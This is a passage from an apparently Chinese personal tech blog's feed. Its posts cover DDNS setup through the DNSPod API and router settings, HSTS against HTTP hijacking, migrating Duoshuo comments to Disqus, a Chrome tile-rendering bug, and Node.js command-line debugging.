DNSPod</strong></p><p>如果你在其他域名提供商购买的域名，你需要将你的域名解析从提供商迁移到 DNSPod，这方面的迁移网上资料很多，可以搜索一下。DNSPod 相比其他提供商的域名解析服务，要更加优质，而且提供了 D监控，实时为你的域名解析保驾护航，有问题会及时邮件、短信警报。</p><p>接着在你的 DNSPod 上添加一个二级域名，比如我就随便搞了一个 <code>proxy.barretlee.com</code>，将它 A记录到任意地址，如 8.8.8.8。</p><p><img src="/../blogimgs/2015/11/07/20151106_9132f343.jpg" alt="DNSPod proxy.barretlee.com"></p><p>这一步完成之后，你就可以通过 DNSPod 提供的接口修改 A 记录了。具体用到了三个接口：</p><ol><li><code>//dnsapi.cn/Domain.List</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -k //dnsapi.cn/Domain.List -d <span class="string">&quot;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&quot;</span></span><br></pre></td></tr></table></figure><p>我在后面加了一个参数 <code>format=json</code>，默认是 xml 格式。在这里可以拿到 Domain 信息，比如我就拿到了在 DNSPod 上的两个域名信息，一个是 barret.cc 的具体信息，一个是 barretlee.com 的具体信息。这里有用的是 barretlee.com 中的 id 字段，我拿到的值为 25348135。</p><ol start="2"><li><code>//dnsapi.cn/Record.List</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -k //dnsapi.cn/Record.List -d <span class="string">&quot;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135&quot;</span></span><br></pre></td></tr></table></figure><p>通过这个接口，可以拿到 barretlee.com 所有子域名的信息，<code>proxy.barretlee.com</code> 对应的 record 的 id 字段值为 126112527。</p><ol start="3"><li><code>//dnsapi.cn/Record.Ddns</code>,<code>//dnsapi.cn/Record.Modify</code></li></ol><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 查询 proxy.barretlee.com 域名对应的 A 记录</span></span><br><span class="line">curl -X POST <span class="regexp">//</span>dnsapi.cn/Record.Ddns -d <span class="string">&#x27;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135&amp;record_id=126112527&amp;record_line=默认&amp;sub_domain=proxy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 修改 proxy.barretlee.com 域名对应的 A 记录</span></span><br><span class="line">curl -X POST <span class="regexp">//</span>dnsapi.cn/Record.Modify -d <span class="string">&#x27;login_email=YOUR_REGISTER_EMAIL&amp;login_password=YOUR_PASSWORD&amp;format=json&amp;domain_id=25348135&amp;record_id=126112527&amp;sub_domain=proxy&amp;record_line=默认&amp;record_type=A&amp;value=YOUR_LOCAL_IP&#x27;</span></span><br></pre></td></tr></table></figure><p>前两个请求是 GET 方式，而这里的请求是 POST 方式，具体文档在 <a href="http://www.dnspod.cn/docs/records.html#record-modify">这里</a>。有人用 <a href="//gist.github.com/chuangbo/833369">python</a> 和 <a href="//github.com/William-Sang/ddns">php</a> 都写了工具，我就没有重复早轮了，后面 php 那个稍微靠谱点，但是查询本地外网 IP 用了他自己提供的服务，我做了点修改（改成使用 ipinfo.io 提供的服务，稍微靠谱点），可以戳这里：</p><p>Github：<a href="http://github.com/barretlee/ddns">http://github.com/barretlee/ddns</a></p><p><strong>3. 定时推</strong></p><p>前文提到，IP 是会变化的，为了保证 proxy.barretlee.com 能够准确解析到本机，IP 变化的时候需要快速更新 A 记录，为了简洁，可以设置定时任务，每隔 1 分钟推送一次：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行</span></span><br><span class="line">crontab -e </span><br><span class="line"><span class="comment"># 写入任务</span></span><br><span class="line">* * * * * php path/to/ddns/index.php</span><br></pre></td></tr></table></figure><p>使用 crontab 创建一个定时任务，实时推送。可以通过 <code>crontab -l</code> 查看任务列表。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 验证效果</span></span><br><span class="line">ping proxy.barretlee.com</span><br></pre></td></tr></table></figure><p>以上就能够通过 proxy.barretlee.com 获取到家里机器的 IP 地址了。需要注意的是，你们家电信宽带服务可能并不是通过路由拨号上网的，当你访问 proxy.barretlee.com 或者拿到的 IP 时，你会看到如下登录提示：</p><p><img src="/../blogimgs/2015/11/07/20151106_b70393af.jpg" alt="login"></p><p>这个时候你就致电 10000，选择人工服务器，让电信帮你设置为通过路由器登录吧~（生效时间估计得二十多分钟，需要重启猫、路由等设备）</p><h3 id="让外网可以访问到路由内网的机器"><a href="#让外网可以访问到路由内网的机器" class="headerlink" title="让外网可以访问到路由内网的机器"></a>让外网可以访问到路由内网的机器</h3><p>上面我们只是解决了，将本机外网的 IP （也就是路由器的 IP）推到 DNSPod，而路由器上是没有装什么软件的，我们不能通过路由器访问到这个小局域网中的任何设备。需要登录到路由器进行一些设置。</p><p>一般的路由器都提供了 web 控制界面，在这里我们需要执行如下操作：</p><p><strong>1. 将局域网内的某个固定 IP 绑定你的电脑</strong></p><p>路由器也是使用 DHCP 随机分配一个 IP 给你的电脑，为了让路由器能够找到你的电脑，可以将电脑的 MAC 地址和 IP 地址对应起来：</p><p><img src="/../blogimgs/2015/11/07/20151106_c3a4f190.jpg" alt="bind mac and ip"></p><p>路由器一般都会有 “IP与MAC绑定这一项”，找到之后，绑定二者，如图中，我的本机 IP 目前为 192.168.0.110。</p><p><strong>2. 将本机 IP 作为对外设备</strong></p><p>DMZ 主机也是路由器自带的，通过DMZ主机功能，广域网中的设备可直接访问局域网中的DMZ主机</p><p><img src="/../blogimgs/2015/11/07/20151106_5f3aa844.jpg" alt="DMZ"></p><p>如果要让局域网中 IP 地址为 192.168.1.110 的主机能够被广域网中的设备直接访问，则可以开启 DMZ 主机功能，在“DMZ主机IP地址”处填入 192.168.1.110 保存即可。</p><p>这个操作相当于将路由的 IP 直接赋予给你的电脑。如果你觉得风险过大，可以通过路由提供的虚拟服务器转发端口，比如外网过来的 10002 端口转发到内网的 80 端口，也就是：</p><p><img src="/../blogimgs/2015/11/07/20151106_1e414c34.jpg" alt="虚拟服务器"></p><p>这样，通过 <code>proxy.barretlee.com:10002</code> 就能访问到 192.168.1.110 机器提供的 web 服务了。</p><h3 id="开始远程控制之旅"><a href="#开始远程控制之旅" class="headerlink" title="开始远程控制之旅"></a>开始远程控制之旅</h3><p><strong>1. 防火墙</strong></p><p>不管是 windows 还是 mac，先查看下你的防火墙，比如你开启了 apache 服务器，就去防火墙看看，这个服务是否允许外部访问，如果不允许，就得设置过来，或者干脆直接关闭防火墙。mac 的防火墙设置在这里：</p><p><img src="/../blogimgs/2015/11/07/20151106_57305bb6.jpg" alt="mac 防火墙"></p><p><strong>2. 开启服务</strong></p><p>如果你只需要远程登录到 mac，可以 <code>enable ssh server</code>，相当于打开 ssh 的服务器，让机器可以被 ssh 。你也可以在电脑上安装 apache&#x2F;nginx&#x2F;nodejs 等等各种服务和程序，你也可以在电脑上设置 vpn server，让电脑作为代理被使用，想怎么折腾就怎么折腾。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>如果你理解整个流程都在做什么，以上操作可以在一小时内搞定。本文，简单点说，就是教你如何把自己的电脑变成一台可访问的服务器。</p><ul><li>关于网速：取决于两端链接的最小网速；</li><li>关于稳定性：不断网的话，貌似 IP 也不会变化太快，1 分钟推一次的频率很频繁了；</li><li>关于安全：我只给我的电脑开了一个 ssh 的口子，除非 mac 系统本身有漏洞或者 ssh 有漏洞，想黑进来也不是件容易的事情。</li></ul><p>好吧，写了一堆，希望给爱折腾的你提供点帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你所不知道的 HSTS</title>
      <link href="/blog/2015/10/22/hsts-intro/"/>
      <url>/blog/2015/10/22/hsts-intro/</url>
      
        <content type="html"><![CDATA[<p>很多人听说过也看到过 301、302，但是几乎从来没有看到过 303 和 307 的状态码。今天在淘宝首页看到了 307 状态码，于是摸索了一把。</p><span id="more"></span><h3 id="中间人劫持"><a href="#中间人劫持" class="headerlink" title="中间人劫持"></a>中间人劫持</h3><p>起因是这样，https 使用的是 443 端口进行数据传输，而浏览器的默认端口是 80. 劫持者首先劫持用户的 80 端口，当用户向目标页发起请求时，劫持者模拟正常的 https 请求向源服务器获取数据，然后通过 80 端口返回给用户，大概可以看下下面两张图：</p><p><img src="/../blogimgs/2015/10/22/20151004_d1771371.jpg" alt="正常请求"></p><p>用户一般不会在地址栏输入 <code>//www.taobao.com</code>，而是习惯性输入 <code>taobao.com</code> ，此时浏览器走的是 http，请求到达服务器之后，服务器告诉浏览器 302 跳转</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Location: <span class="regexp">//</span>www.taobao.com</span><br></pre></td></tr></table></figure><p>然后浏览器重新请求，通过 HTTPS 方式，443 端口通讯。而正因为用户不是直接输入 <code>//</code> 链接，劫持者利用这一点：</p><p><img src="/../blogimgs/2015/10/22/20151004_f70b86fd.jpg" alt="screenshot"></p><p>只要能够劫持你的网络，比如路由劫持、DNS劫持，就可以作为中间人注入代码、替换广告。。。（上了 https 也拗不过电信，真是日了够了）</p><p>这种劫持出现在两种情况下：</p><ul><li>用户没有通过准确的方式访问页面，除非输入 <code>//</code> ，否则浏览器默认以 <code>http</code> 方式访问</li><li>HTTPS 页面的链接中包含 http，这个 http 页面可能被劫持</li></ul><h3 id="启用-HSTS"><a href="#启用-HSTS" class="headerlink" title="启用 HSTS"></a>启用 HSTS</h3><p><a href="http://tools.ietf.org/html/rfc6797">HSTS</a>，HTTP Strict Transport Security，简单说就是强制客户端使用 HTTPS 访问页面。其原理就是：</p><ul><li>在服务器响应头中添加 <code>Strict-Transport-Security</code>，可以设置 <code>max-age</code></li><li>用户访问时，服务器种下这个头</li><li>下次如果使用 http 访问，只要 max-age 未过期，客户端会进行内部跳转，可以看到 307 Redirect Internel 的响应码</li><li>变成 https 访问源服务器</li></ul><p>这个过程有效避免了中间人对 80 端口的劫持。但是这里存在一个问题：如果用户在劫持状态，并且没有访问过源服务器，那么源服务器是没有办法给客户端种下 <code>Strict-Transport-Security</code> 响应头的（都被中间人挡下来了）。</p><p>启用 HSTS 不仅仅可以有效防范中间人攻击，同时也为浏览器节省来一次 302&#x2F;301 的跳转请求，收益还是很高的。我们的很多页面，难以避免地出现 http 的链接，比如 help 中的链接、运营填写的链接等，这些链接的请求都会经历一次 302，对于用户也是一样，收藏夹中的链接保存的可能也是 http 的。</p><h3 id="307-状态码"><a href="#307-状态码" class="headerlink" title="307 状态码"></a>307 状态码</h3><p>在 GET、HEAD 这些幂等的请求方式上，302、303、307 没啥区别，而对于 POST 就不同了，大部分浏览器 都会302 会将 POST 请求转为 GET，而 303 是规范强制规定将 POST 转为 GET 请求，请求地址为 header 头中的 <code>Location</code>，307 则不一样，规范要求浏览器继续向 Location 的地址 POST 内容。</p><p>而在 HSTS 中，307 可以被缓存，缓存时间根据 max-age 而定，一般建议缓存 1 年甚至更长。</p><h3 id="HSTS-存在的坑"><a href="#HSTS-存在的坑" class="headerlink" title="HSTS 存在的坑"></a>HSTS 存在的坑</h3><ul><li>纯 IP 的请求，HSTS 没法处理，比如 <code>http://2.2.2.2</code> ， 即便响应头中设置了 STS，浏览器也不会理会（未测试）</li><li>HSTS 只能在 80 和 443 端口之间切换，如果服务是 8080 端口，即便设置了 STS，也无效（未测试）</li><li>如果浏览器证书错误，一般情况会提醒存在安全风险，然是依然给一个链接进入目标页，而 HSTS 则没有目标页入口，所以一旦证书配置错误，就是很大的故障了</li><li>如果服务器的 HTTPS 没有配置好就开启了 STS 的响应头，并且还设置了很长的过期时间，那么在你服务器 HTTPS 配置好之前，用户都是没办法连接到你的服务器的，除非 max-age 过期了。</li><li>HSTS 能让你的网站在 ssllab 上到 A+（这不是坑）</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文简单说明了 HSTS 的基本原理和相关内容，他在全站 https 下有一个较大的正向作用，推荐使用。</p><p>P.S：在 Chrome 中打开 <code>chrome://net-internals/#hsts</code>，添加域名之后，可以让浏览器强制对该域名启用 https，所有的 http 请求都会内部转到 https。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HSTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三步，将多说评论迁移到 disqus</title>
      <link href="/blog/2015/10/15/duoshuo-migrate-to-disqus/"/>
      <url>/blog/2015/10/15/duoshuo-migrate-to-disqus/</url>
      
        <content type="html"><![CDATA[<p>关于多说，我不想多说什么，看看这两篇文章：</p><ul><li><a href="https://www.barretlee.com/blog/2015/09/15/hei-duoshuo-what-is-wrong/">嘿，多说，你咋了？要不咱换成 DISQUS 吧~</a></li><li><a href="//imququ.com/post/back-to-disqus.html">Disqus，我又回来了！</a></li></ul><span id="more"></span><p>开始在网上搜罗了一番，没找到好用的，很多都是 python 写的，表示没学过 python，网上找了 <a href="http://blog.jamespan.me/2015/04/21/the-duoshuo-migrator/">一个方案</a> 试用，出了好几个问题，最终还是没有搞定。所以自己重新捯饬了一个 nodejs 版本的：</p><ul><li>仓库地址：<a href="http://github.com/barretlee/duoshuo-migrate-to-disqus">http://github.com/barretlee/duoshuo-migrate-to-disqus</a></li><li>参考文档：<a href="//help.disqus.com/customer/portal/articles/472150-custom-xml-import-format">disqus 格式文档</a></li><li>参考文档：<a href="http://dev.duoshuo.com/docs/500fc3cdb17b12d24b00000a">多说格式文档</a></li></ul><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><p><strong>第一步</strong></p><p>进入到你的多说后台，导出多说数据</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>&#123;YOUR_DUOSHUO_NAME&#125;.duoshuo.com<span class="regexp">/admin/</span>tools<span class="regexp">/export/</span></span><br></pre></td></tr></table></figure><p><strong>第二步</strong></p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">//github</span>.com/barretlee/duoshuo-migrate-to-disqus.git</span><br><span class="line">cd duoshuo-migrate-to-disqus</span><br><span class="line">npm install</span><br><span class="line"><span class="keyword">node</span> <span class="title">migrate</span></span><br></pre></td></tr></table></figure><p><strong>第三步</strong></p><p>进入你的 disqus 后台，将数据导入</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>&#123;YOUR_DISQUS_NAME&#125;.disqus.com<span class="regexp">/admin/</span>discussions<span class="regexp">/import/</span>platform<span class="regexp">/generic/</span></span><br></pre></td></tr></table></figure><p>如果操作过程中遇到什么问题，可以在本文留言。</p><p>如果导入到 disqus 无效，有可能是格式存在问题，或者某个字段的格式不对，这大多是因为多说导出的数据就不对。可以在 <code>disqus.ejs</code> 中加些判断，自己做过滤。</p><p>多说这种自杀式的行为颇为可耻！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> disqus </tag>
            
            <tag> 多说 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次淘宝首页奇葩的渲染问题</title>
      <link href="/blog/2015/10/14/a-incredible-bug-in-taobao-homepage/"/>
      <url>/blog/2015/10/14/a-incredible-bug-in-taobao-homepage/</url>
      
        <content type="html"><![CDATA[<p>或许你曾经在 chrome 浏览器上碰到过这样让人瞠目结舌的问题: </p><ul><li>Hover触发一个层展示, hover离开后, 这个层还遗留残影</li><li>浏览器没有清理一个元素渲染的上一个状态, 导致页面多出一个错位的跟该元素一模一样的影子</li><li>交互时突然出现一个方形色块, 覆盖在元素上</li><li>或者还有更奇葩的…</li></ul><span id="more"></span><p>以上列举到的三个问题, 我在维护淘宝首页的时候都遇到过。这些都是浏览器渲染页面时, 因为渲染引擎的 bug 导致的问题, 不常见, 更加难以写 demo 演示, 它们只在特定的复杂场景下, 程序计算存在误差或者漏洞的时候出现, 尤其是涉及到边界判断的时候。</p><h3 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h3><p>很难得有机会让我碰到一个可以复现的, 我把它记录下来了。如下图所示, hover 到学习模块的边界位置时: </p><p><img src="/../blogimgs/2015/10/14/TB1lEgeJVXXXXamXpXXXXXXXXXX-1012-437.gif" alt="problem"><!--<source src="https://img.alicdn.com/tps/TB1lEgeJVXXXXamXpXXXXXXXXXX-1012-437.gif">--></p><p>手动 hover 和模拟 hover 都有一样的问题, 没有多想, 立马加上了一句话修复了这个问题: </p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.channel2</span> <span class="selector-class">.channel-item</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateZ</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个不是直觉, 多次遇到这种奇葩问题, 我第一想到的便是使用 3D 加速将这个渲染层隔离渲染, 80% 以上的概率能够解决问题, 而解决问题的关键在于找准加这句代码的 DOM 元素。</p><h3 id="探索-bug"><a href="#探索-bug" class="headerlink" title="探索 bug"></a>探索 bug</h3><p>这个层在我的代码中肯定是不存在的, 我们只能用 bug 来形容这个问题。因为元素刚好贴在 <code>.channel2</code> 的边界, 猜测应该跟层渲染有关, 于是打开了控制台 <code>ESC -&gt; Rendering -&gt; Show layer borders</code>, 看到了这个: </p><p><img src="/../blogimgs/2015/10/14/TB1HCApJVXXXXaqXXXXXXXXXXXX-1012-437.gif" alt="detail"><!--<source src="https://img.alicdn.com/tps/TB1HCApJVXXXXaqXXXXXXXXXXXX-1012-437.gif">--></p><p>仔细观察, 可以看到, 这个粉色块在瓦片边界和父元素边界之中, 可以断定, 这几个瓦片在渲染的时候存在问题。</p><hr><p>这里需要补充下关于瓦片的知识。瓦片, 英文里头称之为 tile, 它是 webkit&#x2F;blink 渲染页面时的中间过程, 将整个页面分成多个大小一样的瓦片, 并发渲染每个瓦片的内容。一个元素开启 3D 硬件加速之后, 会变成一个独立的层, 这个层的渲染也会被分割成瓦片, 可以想象成一个子页面。</p><p>瓦片和瓦片之间的边界计算是处理的难点, 因为渲染的内容不能错位。</p><hr><p>其实让我找到问题根本原因的是, rendering 块的颜色, 平时在网页上开启 <code>show layer borders</code> 看到的是半透明的绿色块, 而这里显示的是粉色块, 搜索了下不同色块代表的含义, 没找到具体的文档说明, 但是找到了 <a href="http://code.google.com/p/chromium/codesearch#chromium/src/cc/debug/debug_colors.cc&q=debug%20borders&sq=package:chromium&l=270">代码</a>: </p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Missing resize invalidations are in salmon pink.</span></span><br><span class="line">SkColor DebugColors::<span class="built_in">MissingResizeInvalidations</span>() &#123;</span><br><span class="line">  return <span class="built_in">SkColorSetARGB</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">155</span>, <span class="number">170</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的就是这个颜色, “缺失调整验证”, 在 chromium 的源码仓库中搜了上面的代码, 找到了 <a href="http://github.com/SaschaMester/delicium/blob/b7bc83c3b107b30453998daadaeee618e417db5a/cc/playback/raster_source_helper.cc#L58-L103">具体说明</a>: </p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (!deflated_content_rect.<span class="built_in">Contains</span>(canvas_playback_rect)) &#123;</span><br><span class="line">  <span class="selector-tag">if</span> (clear_canvas_with_debug_color) &#123;</span><br><span class="line">    <span class="comment">// Any non-painted areas outside of the content bounds are left in</span></span><br><span class="line">    <span class="comment">// this color.  If this is seen then it means that cc neglected to</span></span><br><span class="line">    <span class="comment">// rerasterize a tile that used to intersect with the content rect</span></span><br><span class="line">    <span class="comment">// after the content bounds grew.</span></span><br><span class="line">    <span class="selector-tag">canvas</span><span class="selector-tag">-</span>&gt;<span class="selector-tag">save</span>();</span><br><span class="line">    <span class="selector-tag">canvas</span><span class="selector-tag">-</span>&gt;<span class="selector-tag">translate</span>(-canvas_bitmap_rect.<span class="built_in">x</span>(), -canvas_bitmap_rect.<span class="built_in">y</span>());</span><br><span class="line">    <span class="selector-tag">canvas</span><span class="selector-tag">-</span>&gt;<span class="selector-tag">clipRect</span>(<span class="attribute">gfx</span>::<span class="built_in">RectToSkRect</span>(content_rect),</span><br><span class="line">                     <span class="attribute">SkRegion</span>::kDifference_Op);</span><br><span class="line">    <span class="selector-tag">canvas</span><span class="selector-tag">-</span>&gt;<span class="selector-tag">drawColor</span>(<span class="attribute">DebugColors</span>::<span class="built_in">MissingResizeInvalidations</span>(),</span><br><span class="line">                      <span class="attribute">SkXfermode</span>::kSrc_Mode);</span><br><span class="line">    <span class="selector-tag">canvas</span><span class="selector-tag">-</span>&gt;<span class="selector-tag">restore</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里能看的肯定就是注释啦, 没有太多上下文, 看的挺头痛！大致翻译了下上下几段注释: </p><blockquote><ol><li>即使完全覆盖, 对于触碰到渲染层边界的栅格化处理, 我们依然需要,在上次记录没有覆盖到的纹理下方和纹理化线性过滤的上方,栅格化处理背景颜色。</li><li>内容的最后的纹理可能只有部分被栅格覆盖</li><li>在内容边界外没有被渲染到的部分将使用 MissingResizeInvalidations 颜色, 如果这个块能够被看见, 那就意味着程序忽视处理了内边边界增长之后栅格化与内容相交的瓦片。</li></ol></blockquote><p>从第三句大致可以了解到, 因为元素的边界增长导致了这个渲染 bug, 回头看了下元素的边界状态, 果然…</p><h3 id="直接原因"><a href="#直接原因" class="headerlink" title="直接原因"></a>直接原因</h3><p>我们看看 hover 上去之后, 层边界的变化: </p><p><img src="/../blogimgs/2015/10/14/TB1I7P2JVXXXXc4XFXXXXXXXXXX-1012-437.gif" alt="border"><!--<source src="https://img.alicdn.com/tps/TB1I7P2JVXXXXc4XFXXXXXXXXXX-1012-437.gif">--></p><p>很明显, 这里的高度溢出了, 但是没有处理, 看了下这个元素的 css, 确实高度上没有做处理, 在元素上添加 </p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.channel-item</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样可以解决问题。</p><p>最后的解决手段: </p><p><img src="/../blogimgs/2015/10/14/TB18MgrJVXXXXXzXXXXXXXXXXXX-1012-437.gif" alt="resolve"><!--<source src="https://img.alicdn.com/tps/TB18MgrJVXXXXXzXXXXXXXXXXXX-1012-437.gif">--></p><p>层渲染的问题我还是比较喜欢使用 3d 硬件加速来处理, 而 <code>overflow:hidden</code> 这样的 css 布局处理上, 我是不太推荐的, 搞不好就把哪个重要的内容隐藏掉了。</p><h3 id="类似问题处理方案"><a href="#类似问题处理方案" class="headerlink" title="类似问题处理方案"></a>类似问题处理方案</h3><p>如果以后大家遇到类似的问题, 可以打开 chrome 的层和瓦片分析工具, 看看渲染出来的块有没有异常色块, 尤其是粉色块。也可以观察交互过程中, 元素的边界有没有变化。</p><p>CSS 在浏览器中的渲染是我们触及比较少的知识, 如果想迅速找到问题, 必须对浏览器的渲染原理有所了解, 并且能够熟练的使用 chrome 提供的调试工具, 这是基础。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
            <tag> 渲染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NodeJS的代码调试和性能调优</title>
      <link href="/blog/2015/10/07/debug-nodejs-in-command-line/"/>
      <url>/blog/2015/10/07/debug-nodejs-in-command-line/</url>
      
        <content type="html"><![CDATA[<p>NodeJS 自 2009 年显露人间，到现在已经六个年头了，由于各种原因，中间派生出了个兄弟，叫做 iojs，最近兄弟继续合体，衍生出了 nodejs4.0 版本，这东西算是 <code>nodejs new 1.0</code> 版本，原班人马都统一到一个战线上。我没有太关注 nodejs 背后的开发，但一直是它的忠实使用者，通读了 v4.1.2 的 <a href="//nodejs.org/api/">文档</a>，感觉从开发者角度去看，也没啥大的变化，所以这两个兄弟分开这么久，主要是在底层内建模块上做改造，上层建筑尚未有大的变更，具体可以看 <a href="//medium.com/node-js-javascript/4-0-is-the-new-1-0-386597a3436d">这篇文章</a>。</p><p>如果你一直用着 nodejs，然而一直都在写最基本的小 demo，很少深入的去剖析 nodejs 的性能问题，甚至连如何 debug 代码、如何发现性能问题都不知从哪里下手，那么赶紧往下读吧！</p><h3 id="命令行调试"><a href="#命令行调试" class="headerlink" title="命令行调试"></a>命令行调试</h3><p>命令行中调试 nodejs 代码，这是最基础的调试技能，如同我们在 Chrome 控制中调试 JS 代码一般，然而却用的很少，因为他太原始，显得比较麻烦。</p><p>回顾下，我们平时的调试方式：</p><ul><li>在某个需要输入的地方输入 <code>console.log()</code>，打印调试结果</li><li>引入 <code>asserts</code> 模块，对调试区域进行 debug</li></ul><p>这两种调试方式，都需要我们显式将各种 debug 信息嵌入到我们的业务逻辑代码中，而熟悉了命令行调试之后，我们可以更好地开启自己的调试之旅。NodeJS 给我们提供了 Debugger 模块，内建客户端，通过 TCP 将命令行的输入传送到内建模块以达到调试的目的。</p><p>在启动文件时，添加第二个参数 <code>debug</code>：</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">➜  $ node debug proxy2.js</span><br><span class="line">&lt; Debugger listening <span class="keyword">on</span> port <span class="number">5858</span></span><br><span class="line">debug&gt; . ok</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">in</span> <span class="attribute">proxy2.js</span>:<span class="number">1</span></span><br><span class="line">&gt; <span class="number">1</span> <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">  <span class="number">2</span> <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line">  <span class="number">3</span> <span class="keyword">var</span> <span class="built_in">url</span> = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">debug&gt;</span><br></pre></td></tr></table></figure><p>调试代码的时候存在两个状态，一个是操作调试的位置，比如下一步，进入函数，跳出函数等，此时为 debug 模式；另一个是查看变量的值，比如进入循环中，想查看循环计数器 i 的值，此时为 repl（read-eval-per-line） 状态，在 debug 模式下输入 <code>repl</code> 即可进入 repl 状态：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">debug&gt; repl</span><br><span class="line">Press Ctrl + C <span class="keyword">to</span> leave <span class="built_in">debug</span> repl</span><br><span class="line">&gt; http</span><br><span class="line"><span class="built_in">print</span> something about http</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>按下 <code>Ctrl+C</code> 可以从 repl 状态回到 debug 状态下，我们也不需要记忆 debug 状态下有多少调试命令，执行 help 即可：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="built_in">debug</span>&gt; help</span><br><span class="line"><span class="symbol">Commands:</span> run (r), cont (c), next (n), step (s), out (o), <span class="keyword">backtrace </span>(<span class="keyword">bt), </span>setBreakpoint (<span class="keyword">sb), </span>clearBreakpoint (cb),</span><br><span class="line">watch, unwatch, watchers, repl, restart, kill, list, <span class="keyword">scripts, </span><span class="keyword">breakOnException, </span><span class="keyword">breakpoints, </span>version</span><br></pre></td></tr></table></figure><p>相关的命令不算很多：</p><table><thead><tr><th>命令</th><th align="center">解释</th></tr></thead><tbody><tr><td>cont, c</td><td align="center">进入下一个断点</td></tr><tr><td>next, n</td><td align="center">下一步</td></tr><tr><td>step, s</td><td align="center">进入函数</td></tr><tr><td>out, o</td><td align="center">跳出函数</td></tr><tr><td>setBreakpoint(), sb()</td><td align="center">在当前行设置断点</td></tr><tr><td>setBreakpoint(line), sb(line)</td><td align="center">在 line 行设置断点</td></tr></tbody></table><p>上面几个是常用的，更多命令可以<a href="//nodejs.org/api/debugger.html#debugger_commands_reference">戳这里</a>。</p><h3 id="NodeJS的调试原理"><a href="#NodeJS的调试原理" class="headerlink" title="NodeJS的调试原理"></a>NodeJS的调试原理</h3><p>我们平时开发都使用 IDE 工具，实际上很多 IDE 工具已经集成了 NodeJS 的调试工具，比如 Eclipse、webStorm 等等，他们的原理依然是利用 Nodejs 的 Debugger 内建模块，在这个基础上进行了封装。</p><p>细心的同学会发现，当我们使用 debug 参数打开一个 node 文件时，会输出这样一行文案：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Debugger</span> listening <span class="literal">on</span> port <span class="number">5858</span></span><br></pre></td></tr></table></figure><p>可以访问下 <code>http://localhost:5858</code>，会看到：</p><p><img src="/../blogimgs/2015/10/07/20151003_0cc888c2.jpg" alt="node debug port 5858"></p><p>它告诉我们 nodejs 在打开文件的时候启动了内建调试功能，并且监听端口 5858 过来的调试命令。除了在命令行中直接调试之外，我们还可以通过另外两种方式去调试这个代码：</p><ul><li><code>node debug &lt;URI&gt;</code>， 通过 URI 连接调试，如 <code>node debug localhost:5858</code></li><li><code>node debug -p &lt;pid&gt;</code> 通过 PID 链接调试</li></ul><p>如果我们使用 <code>--debug</code> 参数打开文件：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  $ <span class="keyword">node</span> <span class="title">--debug</span> proxy2.js</span><br></pre></td></tr></table></figure><p>此时，nodejs 不会进入到命令行模式，而是直接执行代码，但是依然会开启内建调试功能，这就意味着我们具备了远程调试 NodeJS 代码的能力，使用 <code>--debug</code> 参数打开服务器的 nodejs 文件，然后通过：</p><figure 